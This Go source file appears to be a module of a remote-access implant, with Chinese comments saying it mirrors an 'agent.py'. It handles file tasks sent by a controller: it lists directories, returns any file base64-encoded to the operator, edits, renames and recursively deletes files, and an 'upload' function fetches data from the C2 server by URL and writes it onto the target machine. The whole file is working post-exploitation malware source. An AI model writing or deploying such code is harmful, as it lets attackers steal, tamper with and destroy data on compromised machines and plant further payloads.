package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// fileItem 文件列表项，与 agent.py task_file_list 输出字段一致
type fileItem struct {
	Name  string `json:"name"`
	IsDir bool   `json:"is_dir"`
	Size  int64  `json:"size"`
	Mtime string `json:"mtime"`
}

// taskFileList 列出目录，与 agent.py task_file_list 对齐
// 参数: path (默认 ".")
func taskFileList(d map[string]interface{}) string {
	path := tdGetString(d, "path", ".")
	entries, err := os.ReadDir(path)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	items := make([]fileItem, 0, len(entries))
	for _, e := range entries {
		full := filepath.Join(path, e.Name())
		info, err := e.Info()
		var size int64
		var mtime string
		if err == nil {
			size = info.Size()
			mtime = info.ModTime().Format("2006-01-02 15:04:05")
		} else {
			mtime = time.Now().Format("2006-01-02 15:04:05")
		}
		items = append(items, fileItem{
			Name:  e.Name(),
			IsDir: e.IsDir(),
			Size:  size,
			Mtime: mtime,
		})
		_ = full
	}
	abs, _ := filepath.Abs(path)
	out := map[string]interface{}{"path": abs, "items": items}
	b, _ := json.Marshal(out)
	return string(b)
}

// taskFileDownload 下载文件（返回 base64），与 agent.py task_file_download 对齐
// 参数: path
func taskFileDownload(d map[string]interface{}) string {
	path := tdGetString(d, "path", "")
	info, err := os.Stat(path)
	if err != nil {
		return "[ERROR] File not found"
	}
	if info.IsDir() {
		return "[ERROR] Path is a directory"
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	out := map[string]interface{}{
		"filename": filepath.Base(path),
		"data":     base64.StdEncoding.EncodeToString(data),
	}
	b, _ := json.Marshal(out)
	return string(b)
}

// taskFileView 读取文本文件用于在线编辑，与 agent.py task_file_view 对齐
// 限制 512KB；编码探测: utf-8 / utf-8-sig / gbk / latin-1
func taskFileView(d map[string]interface{}) string {
	path := tdGetString(d, "path", "")
	info, err := os.Stat(path)
	if err != nil {
		return "[ERROR] File not found"
	}
	if info.IsDir() {
		return "[ERROR] Path is a directory"
	}
	if info.Size() > 512*1024 {
		out := map[string]interface{}{
			"path": path, "size": info.Size(), "truncated": true,
			"content": "[文件过大，超过512KB，请使用下载功能]", "encoding": "binary",
		}
		b, _ := json.Marshal(out)
		return string(b)
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		return "[ERROR] " + err.Error()
	}

	// 编码探测: utf-8 (含 BOM) → gbk → latin-1
	encoding := "utf-8"
	var text string
	if isUTF8(raw) {
		// 去除 UTF-8 BOM
		clean := raw
		if len(clean) >= 3 && clean[0] == 0xEF && clean[1] == 0xBB && clean[2] == 0xBF {
			clean = clean[3:]
			encoding = "utf-8-sig"
		}
		text = string(clean)
	} else if t, err := decodeGBK(raw); err == nil {
		text = t
		encoding = "gbk"
	} else {
		// latin-1 回退（逐字节映射）
		text = decodeLatin1(raw)
		encoding = "latin-1"
	}

	out := map[string]interface{}{
		"path": path, "size": info.Size(), "truncated": false,
		"content": text, "encoding": encoding,
	}
	b, _ := json.Marshal(out)
	return string(b)
}

// taskFileSave 保存文本到文件，与 agent.py task_file_save 对齐
// 参数: path, content, encoding
func taskFileSave(d map[string]interface{}) string {
	path := tdGetString(d, "path", "")
	content := tdGetString(d, "content", "")
	encoding := strings.ToLower(tdGetString(d, "encoding", "utf-8"))
	if encoding == "binary" || (encoding != "utf-8" && encoding != "utf-8-sig" && encoding != "gbk" && encoding != "latin-1") {
		encoding = "utf-8"
	}
	// 备份原文件
	if info, err := os.Stat(path); err == nil && !info.IsDir() {
		if orig, err := os.ReadFile(path); err == nil {
			_ = os.WriteFile(path+".bak", orig, 0644)
		}
	}
	var data []byte
	switch encoding {
	case "gbk":
		data = encodeGBK(content)
	case "latin-1":
		data = encodeLatin1(content)
	default: // utf-8 / utf-8-sig
		data = []byte(content)
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return "[ERROR] " + err.Error()
	}
	info, _ := os.Stat(path)
	out := map[string]interface{}{
		"path": path, "size": info.Size(), "saved": true, "encoding": encoding,
	}
	b, _ := json.Marshal(out)
	return string(b)
}

// taskFileMkdir 创建目录
func taskFileMkdir(d map[string]interface{}) string {
	path := tdGetString(d, "path", "")
	if err := os.MkdirAll(path, 0755); err != nil {
		return "[-] 创建失败: " + err.Error()
	}
	return fmt.Sprintf("[+] 目录已创建: %s", path)
}

// taskFileDelete 删除文件或目录
func taskFileDelete(d map[string]interface{}) string {
	path := tdGetString(d, "path", "")
	info, err := os.Stat(path)
	if err != nil {
		return "[-] 路径不存在"
	}
	if info.IsDir() {
		if err := os.RemoveAll(path); err != nil {
			return "[-] 删除失败: " + err.Error()
		}
		return fmt.Sprintf("[+] 目录已删除: %s", path)
	}
	if err := os.Remove(path); err != nil {
		return "[-] 删除失败: " + err.Error()
	}
	return fmt.Sprintf("[+] 文件已删除: %s", path)
}

// taskFileRename 重命名
func taskFileRename(d map[string]interface{}) string {
	oldPath := tdGetString(d, "old_path", "")
	newPath := tdGetString(d, "new_path", "")
	if err := os.Rename(oldPath, newPath); err != nil {
		return "[-] 重命名失败: " + err.Error()
	}
	return fmt.Sprintf("[+] 已重命名: %s -> %s", oldPath, newPath)
}

// taskFileUpload 从 C2 下载文件到目标机（对目标而言是"上传"）
// 参数: url, target_path
func taskFileUpload(d map[string]interface{}) string {
	url := tdGetString(d, "url", "")
	targetPath := tdGetString(d, "target_path", "")
	if url == "" || targetPath == "" {
		return "[-] 参数错误: 需要 url, target_path"
	}
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "[-] 上传失败: " + err.Error()
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "[-] 上传失败: " + err.Error()
	}
	if err := os.WriteFile(targetPath, data, 0644); err != nil {
		return "[-] 上传失败: " + err.Error()
	}
	return fmt.Sprintf("[+] 文件已写入: %s (%d bytes)", targetPath, len(data))
}

// ===== 编码辅助 =====

func isUTF8(b []byte) bool {
	return utf8.Valid(b)
}

func decodeGBK(b []byte) (string, error) {
	r := transform.NewReader(strings.NewReader(string(b)), simplifiedchinese.GBK.NewDecoder())
	out, err := io.ReadAll(r)
	if err != nil {
		return "", err
	}
	return string(out), nil
}

func encodeGBK(s string) []byte {
	r := transform.NewReader(strings.NewReader(s), simplifiedchinese.GBK.NewEncoder())
	out, _ := io.ReadAll(r)
	return out
}

func decodeLatin1(b []byte) string {
	out := make([]rune, len(b))
	for i, c := range b {
		out[i] = rune(c)
	}
	return string(out)
}

func encodeLatin1(s string) []byte {
	out := make([]byte, 0, len(s))
	for _, r := range s {
		if r < 256 {
			out = append(out, byte(r))
		} else {
			out = append(out, '?')
		}
	}
	return out
}
